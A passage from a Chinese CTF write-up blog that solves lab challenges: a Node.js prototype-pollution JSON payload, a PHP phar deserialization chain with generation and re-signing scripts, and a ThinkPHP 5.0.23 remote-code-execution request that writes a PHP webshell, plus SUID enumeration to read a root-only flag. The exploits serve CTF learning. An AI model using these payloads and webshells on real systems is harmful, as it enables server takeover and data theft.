class="keyword">typeof</span> fff === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title function_">pad</span>(fff, <span class="number">3</span>)];</span><br><span class="line">                <span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`<span class="subst">$&#123;yyyy&#125;</span>-<span class="subst">$&#123;MM&#125;</span>-<span class="subst">$&#123;dd&#125;</span>T<span class="subst">$&#123;HH&#125;</span>:<span class="subst">$&#123;mm&#125;</span>:<span class="subst">$&#123;ss&#125;</span>`</span> + (<span class="keyword">typeof</span> argTable.<span class="property">fff</span> === <span class="string">&quot;number&quot;</span> ? <span class="string">`.<span class="subst">$&#123;fff&#125;</span>`</span> : <span class="string">&quot;&quot;</span>) + (opts.<span class="property">UTC</span> ? <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="title function_">isSafeInteger</span>(d.<span class="title function_">getTime</span>())) <span class="keyword">return</span> d;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Following: fallback to automatic detection</span></span><br><span class="line">        <span class="comment">// date or date time</span></span><br><span class="line">        <span class="keyword">let</span> date_time, delimiter = <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (str.<span class="title function_">includes</span>(<span class="string">&quot;T&quot;</span>)) &#123; <span class="comment">// T</span></span><br><span class="line">            <span class="keyword">let</span> delimiter_pos = str.<span class="title function_">indexOf</span>(<span class="string">&quot;T&quot;</span>);</span><br><span class="line">            delimiter = <span class="string">&quot;T&quot;</span>;</span><br><span class="line">            date_time = [str.<span class="title function_">substring</span>(<span class="number">0</span>, delimiter_pos), str.<span class="title function_">substring</span>(delimiter_pos + <span class="number">1</span>)];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// space</span></span><br><span class="line">            <span class="keyword">let</span> subdeli_pos1 = str.<span class="title function_">indexOf</span>(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">            <span class="keyword">let</span> subdeli_pos2 = str.<span class="title function_">indexOf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (subdeli_pos2 === -<span class="number">1</span>) subdeli_pos2 = str.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (subdeli_pos1 === -<span class="number">1</span> || subdeli_pos2 === -<span class="number">1</span>) date_time = [str];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> subdeli_pos = <span class="title class_">Math</span>.<span class="title function_">max</span>(subdeli_pos1, subdeli_pos2);</span><br><span class="line">                <span class="keyword">let</span> meetNumber = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">while</span> (--subdeli_pos) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\d/</span>.<span class="title function_">test</span>(str[subdeli_pos])) meetNumber = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">if</span> (meetNumber &amp;&amp; str[subdeli_pos].<span class="title function_">trim</span>() === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                        delimiter = str[subdeli_pos];</span><br><span class="line">                        date_time = [str.<span class="title function_">substring</span>(<span class="number">0</span>, subdeli_pos), str.<span class="title function_">substring</span>(subdeli_pos)];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!meetNumber) date_time = [str];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (date_time.<span class="property">length</span> === <span class="number">1</span>) &#123; <span class="comment">// only date</span></span><br><span class="line">            <span class="keyword">const</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125; = <span class="title function_">getYMD</span>(date_time[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> yyyy === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> <span class="variable constant_">MM</span> === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> dd === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`<span class="subst">$&#123;yyyy&#125;</span>-<span class="subst">$&#123;MM&#125;</span>-<span class="subst">$&#123;dd&#125;</span>T00:00:00`</span> + (opts.<span class="property">UTC</span> ? <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// date and time</span></span><br><span class="line">            <span class="keyword">const</span> s1 = date_time[<span class="number">0</span>].<span class="title function_">trim</span>(), s2 = date_time[<span class="number">1</span>].<span class="title function_">trim</span>();</span><br><span class="line">            <span class="keyword">let</span> date_str, time_str, <span class="variable constant_">UTC</span> = opts.<span class="property">UTC</span>;</span><br><span class="line">            <span class="keyword">if</span> (delimiter === <span class="string">&quot;T&quot;</span>) &#123; <span class="comment">// T</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s1)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">                <span class="variable constant_">UTC</span> = <span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s2);</span><br><span class="line">                date_str = s1, time_str = s2.<span class="title function_">slice</span>(-<span class="number">1</span>) === <span class="string">&quot;Z&quot;</span> ? s2.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>) : s2;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// space</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s1) || <span class="regexp">/Z$/</span>.<span class="title function_">test</span>(s2)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (s1.<span class="title function_">includes</span>(<span class="string">&quot;:&quot;</span>)) date_str = s2, time_str = s1;</span><br><span class="line">                <span class="keyword">else</span> date_str = s1, time_str = s2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> &#123; yyyy, <span class="variable constant_">MM</span>, dd &#125; = <span class="title function_">getYMD</span>(date_str)</span><br><span class="line">            <span class="keyword">const</span> &#123; <span class="variable constant_">HH</span>, mm, ss, fff &#125; = <span class="title function_">getHMS</span>(time_str)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> yyyy === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> <span class="variable constant_">MM</span> === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> dd === <span class="string">&quot;string&quot;</span> &amp;&amp;</span><br><span class="line">                <span class="keyword">typeof</span> <span class="variable constant_">HH</span> === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> mm === <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span> ss === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">`<span class="subst">$&#123;yyyy&#125;</span>-<span class="subst">$&#123;MM&#125;</span>-<span class="subst">$&#123;dd&#125;</span>T<span class="subst">$&#123;HH&#125;</span>:<span class="subst">$&#123;mm&#125;</span>:<span class="subst">$&#123;ss&#125;</span>`</span> + (<span class="keyword">typeof</span> fff === <span class="string">&quot;string&quot;</span> ? <span class="string">`.<span class="subst">$&#123;fff&#125;</span>`</span> : <span class="string">&quot;&quot;</span>) + (<span class="variable constant_">UTC</span> ? <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="string">&quot;Invalid Date&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到createDate函数能够接受两个参数，如果没有传入opts参数，那么直接返回，没有可操作的地方，因此在gitInfo函数中，如果createDate函数的返回值没问题，那么全剧终，利用不了一点，但是如果有问题的话，就会调用catch中的代码，此时是会传入一个opts参数的，因此，第一个目标就是要让createDate函数的返回值出错。</p><p>继续往下看，因为我们传入的opts参数中没有format属性，因此下面代码很明显是可以原型链污染控制opts.format的值的</p><p>  opts.format &#x3D; opts.format.filter(f &#x3D;&gt; typeof f &#x3D;&#x3D;&#x3D; “string”)</p><p>而对于baseDate，由于DEFAULT_CREATE_DATE_OPTIONS中本身不含baseDate，可直接触发该原型链</p><p> opts.baseDate &#x3D; new Date(opts.baseDate || Date.now());</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">createDate</span> = (<span class="params">str, opts</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">CopiedDefaultOptions</span> = <span class="title function_">copyJSON</span>(<span class="variable constant_">DEFAULT_CREATE_DATE_OPTIONS</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts === <span class="string">&quot;undefined&quot;</span>) opts = <span class="title class_">CopiedDefaultOptions</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> opts !== <span class="string">&quot;object&quot;</span>) opts = &#123; ...<span class="title class_">CopiedDefaultOptions</span>, <span class="attr">UTC</span>: <span class="title class_">Boolean</span>(opts) &#125;;</span><br><span class="line">    opts.<span class="property">UTC</span> = <span class="keyword">typeof</span> opts.<span class="property">UTC</span> === <span class="string">&quot;undefined&quot;</span> ? <span class="title class_">CopiedDefaultOptions</span>.<span class="property">UTC</span> : <span class="title class_">Boolean</span>(opts.<span class="property">UTC</span>);</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span> || <span class="title class_">CopiedDefaultOptions</span>.<span class="property">format</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Array</span>.<span class="title function_">isArray</span>(opts.<span class="property">format</span>)) opts.<span class="property">format</span> = [opts.<span class="property">format</span>]</span><br><span class="line">    opts.<span class="property">format</span> = opts.<span class="property">format</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> <span class="keyword">typeof</span> f === <span class="string">&quot;string&quot;</span>)</span><br><span class="line">        .<span class="title function_">filter</span>(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="regexp">/yy|yyyy|MM|dd|HH|mm|ss|fff/</span>.<span class="title function_">test</span>(f) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`At least one format specifier is required.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">`|<span class="subst">$&#123;f&#125;</span>|`</span>.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;yy&quot;</span>).<span class="title function_">split</span>(<span class="regexp">/yy|MM|dd|HH|mm|ss|fff/</span>).<span class="title function_">includes</span>(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`Delimeters are required between format specifiers.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f.<span class="title function_">includes</span>(<span class="string">&quot;yyyy&quot;</span>) &amp;&amp; f.<span class="title function_">replace</span>(<span class="regexp">/yyyy/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">includes</span>(<span class="string">&quot;yy&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`Invalid format &quot;<span class="subst">$&#123;f&#125;</span>&quot;.`</span>, <span class="string">`&quot;yyyy&quot; and &quot;yy&quot; cannot be used together.`</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">    opts.<span class="property">baseDate</span> = <span class="keyword">new</span> <span class="title class_">Date</span>(opts.<span class="property">baseDate</span> || <span class="title class_">Date</span>.<span class="title function_">now</span>());</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">getHMS</span> = (<span class="params">time</span>) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> regres = <span class="regexp">/^(\d+) *\: *(\d+)( *\: *(\d+)( *\. *(\d+))?)?$/</span>.<span class="title function_">exec</span>(time.<span class="title function_">trim</span>())</span><br><span class="line">            <span class="keyword">if</span> (regres === <span class="literal">null</span>) <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">            <span class="keyword">let</span> [n1, n2, n3, n4] = [regres[<span class="number">1</span>], regres[<span class="number">2</span>], regres[<span class="number">4</span>], regres[<span class="number">6</span>]].<span class="title function_">map</span>(<span class="function"><span class="params">t</span> =&gt;</span> <span class="keyword">typeof</span> t === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title class_">Number</span>(t));</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> n3 === <span class="string">&quot;undefined&quot;</span>) n3 = <span class="number">0</span>; <span class="comment">// 23:59(:59)?</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> &lt;= n1 &amp;&amp; n1 &lt;= <span class="number">23</span> &amp;&amp; <span class="number">0</span> &lt;= n2 &amp;&amp; n2 &lt;= <span class="number">59</span> &amp;&amp; <span class="number">0</span> &lt;= n3 &amp;&amp; n3 &lt;= <span class="number">59</span>) &#123;</span><br><span class="line">                <span class="comment">// 23:59:59(.999)?</span></span><br><span class="line">                <span class="keyword">let</span> <span class="variable constant_">HH</span> = <span class="title function_">pad</span>(n1, <span class="number">2</span>), mm = <span class="title function_">pad</span>(n2, <span class="number">2</span>), ss = <span class="title function_">pad</span>(n3, <span class="number">2</span>),</span><br><span class="line">                    fff = <span class="keyword">typeof</span> n4 === <span class="string">&quot;undefined&quot;</span> ? <span class="literal">undefined</span> : <span class="title function_">pad</span>(n4, <span class="number">3</span>).<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">const</span> o = &#123; <span class="variable constant_">HH</span>, mm, ss &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">typeof</span> fff !== <span class="string">&quot;undefined&quot;</span>) o.<span class="property">fff</span> = fff;</span><br><span class="line">                <span class="keyword">return</span> o;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>大致意思是将传入的时间先分开成时、分、秒、毫秒，n1&#x3D;regres[1]&#x3D;时，n2&#x3D;regres[2]&#x3D;分，n3&#x3D;regres[3]&#x3D;秒，n4&#x3D;regres[4]&#x3D;毫秒，当传入的时间中没有毫秒，最后返回的对象也不会有fff属性。在后面注释fallback to automatic detection的部分，有这样的代码，因此如果getHMS函数返回的对象不存在fff属性，就能触发原型链污染。</p><p>const { HH, mm, ss, fff } &#x3D; getHMS(time_str)</p><p>首先考虑如何让createData函数的返回值无效，观察函数的代码，我们发现能够返回的地方有两个，一个实在format模式下，一个是在fallback to automatic detection模式下（先执行format），先看format</p><p>if (Number.isSafeInteger(d.getTime())) return d;</p><p>从上面代码可以看出想要返回无效值是不可能的，因此我们需要想办法绕过format，根据wp可知此处只需要污染basedata即可绕过，同时format函数中还有一段较为关键的代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">sortTable.<span class="title function_">forEach</span>(<span class="function">(<span class="params">f, i</span>) =&gt;</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (f == <span class="string">&quot;yy&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">let</span> year = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                        year = year &lt; <span class="number">100</span> ? (<span class="number">1900</span> + year) : year;</span><br><span class="line">                        <span class="keyword">return</span> argTable[<span class="string">&quot;yyyy&quot;</span>] = year;</span><br><span class="line">                    &#125;</span><br><span class="line">                    argTable[f] = <span class="title class_">Number</span>(regres[i + <span class="number">1</span>])</span><br><span class="line">                &#125;)</span><br></pre></td></tr></table></figure><p>表示支持yy标识符，当年份小于100时，我们认为是20世纪的年份</p><p>举例来说，如果<code>format</code>为<code>20yy-MM-dd</code>，在<code>format</code>解析字符串<code>2023-10-01</code>时，将解析<code>yy</code>为<code>23</code>，输出输出为<code>1923</code>，最终输出的年份是<code>1923-10-01，这一点可以帮助我们获取很早时间的数据。</code></p><p>触发catch的条件是前面try的createDate返回一个无效的日期，或者createDate本身被调用时法神错误</p><p>目标：触发<code>createDate</code>错误，或使<code>createDate</code>返回无效日期</p><p>最后再看fallback to automatic detection模式，当fff为string时直接返回，结合上文我们可以污染fff为无效的字符，使最后的返回时间无效，执行最开头catch中的内容，此时取得是DEFAULT_CONFIG.min_public_time，也就是min_public_time: “2019-07-08T16:00:00.000Z”，结合之前讲的yy标识符，我们只需要污染format为：yy19-MM-ddTHH:mm:ss.fffZ</p><p>就能将返回时间改成1919-07-08T16:00:00.000Z.</p><p>也就是说污染<code>baseDate</code>为无效日期即可绕过 format 模式进入 Fallback Auto Detection</p><p><code>routes/info.js</code>的<code>try</code>中用的是<code>config.js</code>中的<code>min_pulic_time</code>，为<code>2019-07-09 00:00:00</code>，不带有毫秒，刚好能够触发<code>fff</code>的原型链污染，为<code>fff</code>指定为无效值即可</p><p>到此为止，使用如下的 payload 可以触发<code>catch</code></p><p>{</p><p>  “contact”:”1”, “reason”:”2”,</p><p>  “constructor”:{</p><p>​    “prototype”:{</p><p>​      “baseDate”:”aaa”,</p><p>​      “fff”: “bbb”</p><p>​    }</p><p>  }</p><p>}</p><p>进入<code>catch</code>后，达到了污染<code>format</code>的条件，但是<code>createDate</code>的参数变成了<code>config.default.js</code>中的<code>min_public_time</code>，为<code>2019-07-08T16:00:00.000Z</code>，因此可以构造<code>format</code>为<code>yy19-MM-ddTHH:mm:ss.fffZ</code></p><p>然后基于<code>format</code>的日期匹配会返回<code>1919-07-08T16:00:00.000Z</code>的日期，已经将<code>minTimestamp</code>提早了近一个世纪了</p><p>因此最终的<code>payload</code>为</p><p>{<br>    “contact”:”a”, “reason”:”a”,<br>    “constructor”:{<br>        “prototype”:{<br>            “format”: “yy19-MM-ddTHH:mm:ss.fffZ”,<br>            “baseDate”:”aaa”,<br>            “fff”: “bbb”<br>        }<br>    }<br>}</p><p>污染database和fff来绕过format模式——》</p><p>污染format模板使他可以以yy模式匹配min_public_time: “2019-07-08T16:00:00.000Z”——》</p><p>所以</p><p>以<code>Content-Type: application/json</code>的 Header 用<code>POST</code>方法向路径<code>/submit</code>请求即可</p><p>然后再请求<code>/info/0</code>，找到含有 flag 的一条数据</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9479195.png" alt="image-20240218232807243"></p><p>flag{63834b07-2417-4e14-b558-96d8511fe3ac}</p><p>真的难 做吐了</p><h2 id="week5"><a href="#week5" class="headerlink" title="week5"></a>week5</h2><h3 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h3><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240218234656806.png?lastModify=1715614296" alt="image-20240218234656806"></p><p>发现提示</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240218235042362.png?lastModify=1715614296" alt="image-20240218235042362"></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240218235155564.png?lastModify=1715614296" alt="image-20240218235155564"></p><p>找到源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);  </span><br><span class="line">class story&#123;</span><br><span class="line">    private $user=&#x27;admin&#x27;;</span><br><span class="line">    public $pass;</span><br><span class="line">    public $eating;</span><br><span class="line">    public $God=&#x27;false&#x27;;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;user=&#x27;human&#x27;;</span><br><span class="line">        if(1==1)&#123;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if(1!=1)&#123;</span><br><span class="line">            echo $fffflag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;user=&#x27;AshenOne&#x27;;</span><br><span class="line">        $this-&gt;eating=&#x27;fire&#x27;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        return $this-&gt;user.$this-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        if($this-&gt;user==&#x27;admin&#x27;&amp;&amp;$this-&gt;pass==&#x27;admin&#x27;)&#123;</span><br><span class="line">            echo $nothing;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        if($this-&gt;God==&#x27;true&#x27;&amp;&amp;$this-&gt;user==&#x27;admin&#x27;)&#123;</span><br><span class="line">            system($this-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;Get Out!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line">if(isset($_GET[&#x27;pear&#x27;])&amp;&amp;isset($_GET[&#x27;apple&#x27;]))&#123;</span><br><span class="line">    // $Eden=new story();</span><br><span class="line">    $pear=$_GET[&#x27;pear&#x27;];</span><br><span class="line">    $Adam=$_GET[&#x27;apple&#x27;];</span><br><span class="line">    $file=file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">    file_put_contents($pear,urldecode($file));</span><br><span class="line">    file_exists($Adam);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;多吃雪梨&#x27;;</span><br><span class="line">&#125; 多吃雪梨</span><br></pre></td></tr></table></figure><p>phar反序列化</p><p>测当前页面在&#x2F;var&#x2F;www&#x2F;html下</p><p>把php:&#x2F;&#x2F;input的内容写进<code>$pear 中，文件的路径和名称我们都可控，只要大胆猜测当前页面在/var/www/html下即可（做题的经验），将payload：&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt; urlencode后传入即可。</code></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219155546050.png?lastModify=1715614296" alt="image-20240219155546050"></p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219155559071.png?lastModify=1715614296" alt="image-20240219155559071"></p><p>预期解：</p><p>再来讲预期解，能传入文件，有反序列化，又有<code>file_exists（）函数，一看就是phar反序列化了，反序列化很简单，只要绕过__wakeup函数即可，查看php版本为7.0.9，只要让真实属性值不匹配即可。</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class story&#123;</span><br><span class="line">    public $eating = &#x27;cat /f*&#x27;;</span><br><span class="line">    public $God=&#x27;true&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //生成时后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new story();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将生成的phar.phar文件打开，将2改成大于2的值</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219160051286.png?lastModify=1715614296" alt="image-20240219160051286"></p><p>因为我们修改了phar.phar的值，因此该文件的签名与修改后的文件不匹配，我们需要用脚本更新签名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from hashlib import sha1</span><br><span class="line"> </span><br><span class="line">import gzip</span><br><span class="line"> </span><br><span class="line">file = open(r&#x27;D:\phpstudy_pro\WWW\php\phar.phar&#x27;, &#x27;rb&#x27;).read()  #文件的路径</span><br><span class="line"> </span><br><span class="line">data = file[:-28]  # 获取需要签名的数据</span><br><span class="line"># data = data.replace(b&#x27;3:&#123;&#x27;, b&#x27;4:&#123;&#x27;) #更换属性值，绕过__wakeup</span><br><span class="line"> </span><br><span class="line">final = file[-8:]  # 获取最后8位GBMB标识和签名类型</span><br><span class="line"> </span><br><span class="line">newfile = data + sha1(data).digest() + final  # 数据 + 签名 + 类型 + GBMB</span><br><span class="line"> </span><br><span class="line">open(r&#x27;D:\phpstudy_pro\WWW\php\new.phar&#x27;, &#x27;wb&#x27;).write(newfile)  # 写入到新的phar文件</span><br><span class="line"> </span><br><span class="line">newf = gzip.compress(newfile)</span><br><span class="line">with open(r&#x27;D:\phpstudy_pro\WWW\php\2.jpg&#x27;, &#x27;wb&#x27;) as file: #更改文件后缀</span><br><span class="line">     file.write(newf)</span><br></pre></td></tr></table></figure><p> 改完后上传文件，利用phar协议访问即可</p><p>?pear&#x3D;1.phar&amp;apple&#x3D;phar:&#x2F;&#x2F;1.phar</p><p>好难</p><h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219160453669.png?lastModify=1715614296" alt="image-20240219160453669"></p><p>thinkphp v5</p><p>考虑ThinkPHP版本的漏洞</p><p>让它报错看下版本</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219160848137.png?lastModify=1715614296" alt="image-20240219160848137"></p><p>V5.0.23</p><p>然后直接上网搜该版本存在的漏洞：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=ThinkPHP是一款运用极广的PHP开发框架</span><br><span class="line"></span><br><span class="line">其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞</span><br><span class="line"></span><br><span class="line">1.访问靶机地址+端口号 进入首页</span><br><span class="line">2.bp抓包变更请求为POST，传入参数，其中pwd为系统执行命令可进行一系列操作</span><br><span class="line">3._method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=pwd</span><br></pre></td></tr></table></figure><p>首先抓包进行传参</p><p>GET:index.php?s&#x3D;captcha POST:_method&#x3D;__construct&amp;filter[]&#x3D;phpinfo&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;1</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219171814208.png?lastModify=1715614296" alt="image-20240219171814208"></p><p>这个参数1 是可以进行修改的</p><p>回显了phpinfo</p><p>发现命令执行参数全被ban</p><p>上传一句话木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;&lt;?php%20eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27;%20&gt;%20/var/www/public/1.php</span><br></pre></td></tr></table></figure><p>然后蚁剑连接后发现根目录下存在flag文件 但是里面内容没有</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219175455145.png?lastModify=1715614296" alt="image-20240219175455145"></p><p>可能是没权限</p><p>进入终端看一下</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181234415.png?lastModify=1715614296" alt="image-20240219181234415"></p><p>rwx 最高权限才能读</p><p>查看具有SUID权限的命令</p><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181608901.png?lastModify=1715614296" alt="image-20240219181608901"></p><p>没有回显？</p><p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20240219181704573.png?lastModify=1715614296" alt="image-20240219181704573"></p><p>但是可以读取</p><p>cp &#x2F;flag_dd3f6380aa0d &#x2F;dev&#x2F;stdout</p><p>别人的：</p><p><img 